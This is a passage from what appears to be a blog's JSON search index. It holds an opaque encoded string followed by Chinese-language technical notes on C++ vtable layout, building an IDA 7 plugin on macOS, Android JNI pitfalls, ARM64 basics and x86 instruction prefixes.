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","tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/正则表达式/"}]},{"title":"C++类结构以及vtable分析","date":"2017-12-02T10:07:00.000Z","path":"2017/12/02/C++类结构以及vtable分析/C++类结构以及vtable分析/","text":"C++类结构以及vtable分析 通过实验自己对一些C++数据结构的理解 实验一#include &lt;iostream&gt; using namespace std; // 基类 class Shape { public: void setWidth(int w) { width = w; } void setHeight(int h) { height = h; } protected: int width; int height; }; // 派生类 class Rectangle: public Shape { public: int getArea() { return (width * height); } }; int main(void) { Rectangle Rect; Rect.setWidth(5); Rect.setHeight(7); // 输出对象的面积 cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl; return 0; } 上面的代码编译完成后，在ida中反汇编如下 int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // ST08_8 unsigned int v4; // eax char v6; // [rsp+10h] [rbp-20h] int v7; // [rsp+1Ch] [rbp-14h] __int64 (__fastcall *v8)(_QWORD); // [rsp+20h] [rbp-10h] __int64 v9; // [rsp+28h] [rbp-8h] v7 = 0; Shape::setWidth((Shape *)&amp;v6, 5); Shape::setHeight((Shape *)&amp;v6, 7); v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;); v4 = Rectangle::getArea((Rectangle *)&amp;v6); v9 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4); v8 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;; std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v9); return 0; } Rect内存布局 (lldb) x/20b $rbp-0x20 0x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00 0x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。 int __cdecl main(int argc, const char **argv, const char **envp) { void *v3; // ST10_8 __int64 v4; // ST08_8 unsigned int v5; // eax __int64 v6; // ST38_8 v3 = (void *)operator new(8uLL); memset(v3, 0, 8uLL); Shape::setWidth((Shape *)v3, 5); Shape::setHeight((Shape *)v3, 7); v4 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;); v5 = Rectangle::getArea((Rectangle *)v3); v6 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, v5); std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v6); return 0; } 这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。 实验二#include &lt;iostream&gt; using namespace std; // 基类 class Shape { public: // 提供接口框架的纯虚函数 virtual int getArea() = 0; void setWidth(int w) { width = w; } void setHeight(int h) { height = h; } protected: int width; int height; }; // 派生类 class Rectangle: public Shape { public: int getArea() { return (width * height); } }; class Triangle: public Shape { public: int getArea() { return (width * height)/2; } }; int main(void) { Rectangle Rect; Triangle Tri; Rect.setWidth(5); Rect.setHeight(7); // 输出对象的面积 cout &lt;&lt; &quot;Total Rectangle area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl; Tri.setWidth(5); Tri.setHeight(7); // 输出对象的面积 cout &lt;&lt; &quot;Total Triangle area: &quot; &lt;&lt; Tri.getArea() &lt;&lt; endl; return 0; } 上面的代码编译完成后，在ida中反汇编如下 int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // ST20_8 unsigned int v4; // eax __int64 v5; // ST10_8 unsigned int v6; // eax char v8; // [rsp+28h] [rbp-48h] char v9; // [rsp+38h] [rbp-38h] int v10; // [rsp+4Ch] [rbp-24h] __int64 (__fastcall *v11)(_QWORD); // [rsp+50h] [rbp-20h] __int64 v12; // [rsp+58h] [rbp-18h] __int64 (__fastcall *v13)(_QWORD); // [rsp+60h] [rbp-10h] __int64 v14; // [rsp+68h] [rbp-8h] v10 = 0; Rectangle::Rectangle((Rectangle *)&amp;v9); Triangle::Triangle((Triangle *)&amp;v8); Shape::setWidth((Shape *)&amp;v9, 5); Shape::setHeight((Shape *)&amp;v9, 7); v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Rectangle area: &quot;); v4 = Rectangle::getArea((Rectangle *)&amp;v9); v12 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4); v11 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;; std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v12); Shape::setWidth((Shape *)&amp;v8, 5); Shape::setHeight((Shape *)&amp;v8, 7); v5 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Triangle area: &quot;); v6 = Triangle::getArea((Triangle *)&amp;v8); v14 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, v6); v13 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;; std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v14); return 0; } 这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下 __int64 *__fastcall Rectangle::Rectangle(Rectangle *this) { __int64 *result; // rax Shape::Shape(this); result = &amp;`vtable for&#39;Rectangle + 2; *(_QWORD *)this = &amp;`vtable for&#39;Rectangle + 2; return result; } 这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下 __int64 *__fastcall Shape::Shape(Shape *this) { __int64 *result; // rax result = &amp;`vtable for&#39;Shape + 2; *(_QWORD *)this = &amp;`vtable for&#39;Shape + 2; return result; } 其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。 这里的虚函数表地址，本质就是_DATA段的一个数据结构。 Rect的内存布局为 (lldb) x/20b $rbp-0x38 0x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x00 0x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00 这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height 去ida中查看该地址 __data:0000000100002110 ; `vtable for&#39;Rectangle __data:0000000100002110 __ZTV9Rectangle dq 0 ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o __data:0000000100002110 ; offset to this __data:0000000100002118 dq offset __ZTI9Rectangle ; `typeinfo for&#39;Rectangle __data:0000000100002120 dq offset __ZN9Rectangle7getAreaEv ; Rectangle::getArea(void) 就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。 一点理解C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。","tags":[{"name":"C++","slug":"C","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"}]},{"title":"IDA7.0 Mac 插件编译指南v1","date":"2017-11-30T06:25:09.000Z","path":"2017/11/30/IDA-Mac-插件编写指南/IDA-Mac-插件编写指南/","text":"先说两句前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因此插件同样为64位的dylib。不仅这样，SDK上某些接口也发生了改变，导致很多优秀的插件不得不重新改动源码，很多在IDA7上编译也存在问题。下面我将以IDA的官方插件findcrypt2来说明IDA7的插件编译细节。编译IDA插件是个麻烦事，主要在于网上相关的资料很少，唯一的几篇也是年代久远，Makefile里面很多编译参数都有变化，目前来说，没有一个完整的文章来介绍如何在Mac平台下编译IDA插件的指南。希望这边文章能够对有这需求的人有所帮助。 搭建xcode环境在Mac上完全可以用xcode来帮助我们编译IDA插件，其实更常见的是用Makefile编译，但原理一样，所以这里就以xcode来介绍。 我们知道IDA的插件的文件格式为dylib动态库，因此在创建xcode项目时在Framework&amp;Libarry中选择Libarry 然后再选择为Dynamic动态库，并导入C++标准库 接下来项目中自动会生成两个文件。暂时不用管，我们把findcrypt2的源码放入该项目，最后如下图所示 这时你的项目中像ida.hpp这类的头文件肯定会提示找不到，还需要进一步设置。 Build setting这里我们将设置头文件和库的搜索路径等等。 首先设置目标架构为x86_64 然后设置头文件和库的搜索路径，依据你IDA及sdk路径改成对应路径 经过上面的设置，此时xcode应该能找到头文件了，这时还需要设置连接的静态库 这里连接的库为-lida64，表示我们编译的是解析64位的插件，若要编译解析32位的插件，这里为-lida即可。 最后我们还需要设置编译参数 其中__EA64__在编译64位插件时才有。 这时候build一下，如果一切顺利，应该就不会报错了。 最后说两句IDA7相以前版本而言，插件的后缀名统一为dylib格式，之前32位为pmc，64位为pmc64。这里将编译好的插件改为findcrypt264.dylib表示为64位插件，则对应的32位插件名为findcry.dylib 下面测试下效果，我们打开IDA去解析一个含有md4加密的macho文件，运行插件测试能否识别出其中的加密算法。 上图我们可以看到这里成功找到一处md4加密，反汇编窗口中正是md4加密中用到的常量数组。我顺便为插件注册了Ctrl-Alt-z的快捷键，若没有快捷键，可以在插件的导航栏里点击对应的插件即可。 完附上该插件，完。 findcrypt264.dylib_for_ida7_made_by_x1a0 参考链接 http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/ https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile ​","tags":[{"name":"ida","slug":"ida","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ida/"}]},{"title":"Android JNI踩坑笔记","date":"2017-11-28T09:00:20.000Z","path":"2017/11/28/Android_JNI_掉坑笔记 /JNI/","text":"最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。 坑1–jni方法签名分号问题这是一个很常见的问题，第一次写jni中方法签名的时候很容易遇到这个错误，比如下面这个签名 jmethodID equals_id = env-&gt;GetMethodID(string_c, &quot;equals&quot;, &quot;(Ljava/lang/Object;)Z&quot;); 切记当参数或者返回值不是基本类型的时候一定要在末尾加上分号。 jmethodID iterator_id = env-&gt;GetMethodID(list_c,&quot;iterator&quot;,&quot;()Ljava/util/Iterator;&quot;); 这类错误常见描述为方法找不到错误。如果遇到类方法找不到切记先检查方法签名是否正确。 坑2–原生方法包含默认2个参数这个坑当然是对jni使用不熟练造成的，未了解其特性，所以对于初学者来说容易犯。看一个原生函数 static jboolean nativeFunction(JNIEnv *env, jobject content, jobject someObj){...} 第一个保留参数为JNIEnv虚拟机环境变量，第二个为调用该原生方法的java类对象即上下文。这里多说一句，第二个参数的上下文需根据该方法为静态方法还是实例方法，若为静态方法，则这里上下文为类引用；若为实例方法，则上下文为该类的对象引用。若把类引用当做对象引用，在查找方法id时则会出现方法找不到错误。 由于很多时候不声明这两个参数同样能正确运行（无其他参数时）导致忽略了第二个参数的存在，以为第二个上下文参数为传入的对象引用。 这类错误常见描述为当你在某处调用这个对象的方法时，会提示找不到该方法。因为这个对象根本不是你传入的对象。 坑3—jni调用父类方法的正确姿势这里就以一个正确的调用父类方法的流程来讲，起因是当我在查找Exception这个类的getStackTrace 方法时提示方法找不到错误，调了会才发现这个方法是在其父类Throwable中，所以正确的写法为： jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;); jclass throwable_c = env-&gt;FindClass(&quot;java/lang/Throwable&quot;); jmethodID getStackTrace_id = env-&gt;GetMethodID(throwable_c, &quot;getStackTrace&quot;,&quot;()[Ljava/lang/StackTraceElement;&quot;); 那么怎么调用呢？用CallNonvirtual&lt;XXX&gt;Method去调用父类中的方法，一个调用例子： jobjectArray stes = (jobjectArray)env-&gt;CallNonvirtualObjectMethod(excep, throwable_c, getStackTrace_id); 这里需要传入三个参数，第一个为子类的对象引用，第二个为父类类引用，第三个为方法id。 坑4—其他小坑写jni代码时最大的麻烦在于要写很多代码去定位java中的类和方法，java中一个很简单的调用，在jni层写时或许要写很大一堆，这也不奇怪，因为没有了Android虚拟机，这些本来由虚拟机做的事必须得手动去完成。在写jni层代码时，还有一些小的错误，比如jstring与char*的转换，LOGE()函数中参数为char*的字符串。当然还有一些java与C语言类型对应的问题就不多说了，自己翻下jni.h头文件就能找到。 还有个AndroidStudio的bug在于不能正确的解析jni等头文件，虽然不影响编译，但没有了代码提示以及显示红色看着也挺难受的。网上找到一个解决办法，在对应的build.gradle文件中在defaultConfig{}加入下面的脚本： sourceSets.main{ jni.srcDirs &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-mips/usr/include&#39; jniLibs.srcDir &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-arm/usr/lib&#39; } 无非是手动指定了jni相关的文件路径。 关于下面两类写法： jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;); jclass exception_c = (*env)-&gt;FindClass(env, &quot;java/lang/Exception&quot;); 原因在于C++和C的两种写法，可以在文件中宏定义为C++的即可。 完说了这些坑，当然我都踩过，由于刚接触Android jni特性。所以踩了很多坑，尤其是Android不像iOS那样容易debug，多了一层虚拟机导致很多错误不好调式。说到这，还要吐槽下AndroidStudio的gradle这个项目管理器，各种版本或者莫名奇怪的错误，虽然Xcode同样不是很好用，但相比之下，Xcode省心多了。 继续踩坑去了…","tags":[{"name":"android","slug":"android","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"}]},{"title":"ARM64基础知识整理","date":"2017-10-21T10:07:00.000Z","path":"2017/10/21/ARM64基础知识整理/ARM64基础知识整理/","text":"ARM64基础知识整理Register参数寄存器 (X0-X7)参数寄存器，在函数调用的时候传参使用。X0-X7分别对应8个参数，多于8个的参数保存在栈中。 其他特殊寄存器 X29(FP) 栈帧寄存器 类比x64中rbp X30(LR) 链接寄存器，保存函数返回地址，x64该地址保存在栈中 SP 栈顶寄存器，类比x64中 PC 指向下一条指令 寄存器 描述 CPSR 状态寄存器 Instructions mov mov x0, x1; copies x1 into x0 mov x1, 0x4141; loads the value 0x4141 in x1 str/ldr str x0, [x29]; store x0 at the address in x29 ldr x0, [x29]; load the value from the address in x29 into x0 stp/ldp stp x29, x30, [sp]; store x29 at sp and x30 at sp+8 b/br br x0; jump to the address stored in x0 ret Unlike it’s x86 equivalent which pops the return address from stack, it looks for the return address in the x30 register and jumps there. Indexing modes Immediate offset : [base, #offset] - Index an offset directly and don’t mess with anything else ldr x0, [sp, 0x10]; load x0 from sp+0x10 Pre-indexed : [base, #offset]! - Almost the same as above, except that base+offset is written back into base. ldr x0, [sp, 0x10]!; load x0 from sp+0x10 and then increase sp by 0x10 Post-indexed : [base], #offset - Use the base directly and then write base+offset back into the base ldr x0, [sp], 0x10; load x0 from sp and then increase sp by 0x10 函数调用demo分析__text:000000010004F0D4 SUB SP, SP, #0x70 __text:000000010004F0D8 STP X24, X23, [SP,#0x60+var_30] __text:000000010004F0DC STP X22, X21, [SP,#0x60+var_20] __text:000000010004F0E0 STP X20, X19, [SP,#0x60+var_10] __text:000000010004F0E4 STP X29, X30, [SP,#0x60+var_s0] __text:000000010004F0E8 ADD X29, SP, #0x60 __text:000000010004F0EC MOV X19, X0 __text:000000010004F0F0 ADRP X8, #___stack_chk_guard_ptr@PAGE __text:000000010004F0F4 LDR X8, [X8,#___stack_chk_guard_ptr@PAGEOFF] __text:000000010004F0F8 LDR X8, [X8] __text:000000010004F0FC STR X8, [SP,#0x60+var_38] __text:000000010004F100 ADRP X8, #classRef_Fabric@PAGE __text:000000010004F104 LDR X20, [X8,#classRef_Fabric@PAGEOFF] __text:000000010004F108 NOP __text:000000010004F10C LDR X0, [X8,#classRef_Crashlytics@PAGEOFF] ; void * __text:000000010004F110 ADRP X8, #selRef_class@PAGE __text:000000010004F114 LDR X1, [X8,#selRef_class@PAGEOFF] ; char * __text:000000010004F118 BL _objc_msgSend ... __text:000000010004F2F4 LDP X29, X30, [SP,#0x60+var_s0] __text:000000010004F2F8 LDP X20, X19, [SP,#0x60+var_10] __text:000000010004F2FC LDP X22, X21, [SP,#0x60+var_20] __text:000000010004F300 LDP X24, X23, [SP,#0x60+var_30] __text:000000010004F304 ADD SP, SP, #0x70 __text:000000010004F308 RET 地址 栈值 描述 sp=sp-0x70 局部变量空间 sp-0x60 局部变量空间 sp-0x50 局部变量空间 sp-0x40 X24/X23 保存寄存器信息 sp-0x30 X22/X21 保存寄存器信息 sp-0x20 X20/X19 保存寄存器信息 X29 –&gt; sp-0x10 X29/X30 保存前栈基址和返回地址 sp=sp 调用前的栈顶地址 Arm32 参考 https://www.jianshu.com/p/2f4a5f74ac7a https://wiki.cdot.senecacollege.ca/wiki/Aarch64_Register_and_Instruction_Quick_Start https://blog.perfect.blue/ROPing-on-Aarch64 https://azeria-labs.com/assembly-basics-cheatsheet/","tags":[{"name":"ARM64","slug":"ARM64","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ARM64/"}]},{"title":"X86指令编码笔记","date":"2017-10-11T03:46:13.000Z","path":"2017/10/11/x86指令编码笔记/X86指令编码笔记/","text":"由于重装系统同步导致原文章消失，只能再写一遍，方便以后查阅。 x86指令编码格式很多时候我们都是查阅指令参考页去了解一个指令的含义，但这并不能理解指令的编码格式。而只有学会看懂opcode表的时候才是王道。 x86是一种CISC指令集，CISC的全称是“Complex Instruction Set Computer”，表示的是一种复杂的指令集，其中一个最重要的复杂性在于在这个指令集中，指令是不定长的，要使得CPU在这种不定长的指令集里面确定每一条指令的含义，就需要一种特定的指令格式，下图显示了Intel 64和IA-32架构下的指令格式，当然，这两种架构所采用的都是x86指令编码： 从上面可以看出，x86指令格式中，由6部分组成，但在这之中只有opcode是必须的，其余都是可选。我们稍后就介绍这些组成部分。 指令prefixprefix简单的说来就是调整内存操作数属性，增强指令的作用等。 lock 和 repeat 其中，LOCK prefix保证该条指令对共享内存的访问是独占的；而repeat prefixes 表示这条指令会重复执行多次，直到某个条件满足位置。其中第二种repeat prefix只能用在对string的操作，或者对I/O的操作上。 operand-size override （66H — 改变默认操作数大小） 这个prefix主要是在解析指令的操作数的时候，可以在十六位或者三十二位的操作数大小间进行切换。 address-size override （67H — 改变默认操作数地址大小） 这个prefix主要是在进行指令寻址的时候，可以在十六位或者三十二位的地址大小中进行切换。 segment override，branch hints 和 bound 其中，segment override prefix会在执行这条指令的时候将默认的段寄存器给换掉；branch hints prefix主要应用在条件跳转指令（Jcc）中，可以协助CPU进行指令的prefetch；而bound prefix主要是用intel MPX硬件特性上。 ​ | 2E | 3E | 26 | 64 | 65 | 36 || ———– | ———– | ———– | ———– | ———– | ———– || CS register | DS register | ES register | FS register | GS register | SS register | REX prefix—开启 64 位计算的基石REX prefix 是不定值，它的取值范围是：40 - 4F （共 16 个） 7 6 5 4 3 2 1 0 0 1 0 0 W R X B W: operand width 标志位，当 W = 0 时使用 default operand size,当 W = 1 时使用 64 位 operand size R: 用来扩展 ModRM.reg 域 X: 用来扩展 SIB.index 域 B: 用来扩展 SIB.base, ModRM.r/m 以及 Opcode.reg 寄存器编码表 下面来分析这条指令： mov eax,ebx 正常编码为：89 d8 下面看看在不同的REX.W和66H prefix下的不同： 48 89 d8——————&gt; mov rax,rbx 66 48 89 d8—————&gt; mov rax,rbx 66 40 89 d8—————&gt; mov ax, bx ​ 第 1 条指令编码使用 REX prefix 扩展访问 64 位寄存器，REX.W = 1 第 2 条指令编码加上了 66H prefix 同时还有 REX prefix（REX.W = 1），此时一般会认为产生了冲突：是使用 64 位还是 16 位 operand size 呢？实际上，很简单！48H 位于 66H 后面，66H 将被覆盖！也就是说：66H prefix 将会被忽略，REX prefix 产生了作用！因此：指令的 operand size 是 64 位的。 第 3 条指令编码也同样使用了 66H prefix 和 REX prefix，但是 REX.W = 0 意味着不改变原来的 operand size！在这种情况下，REX 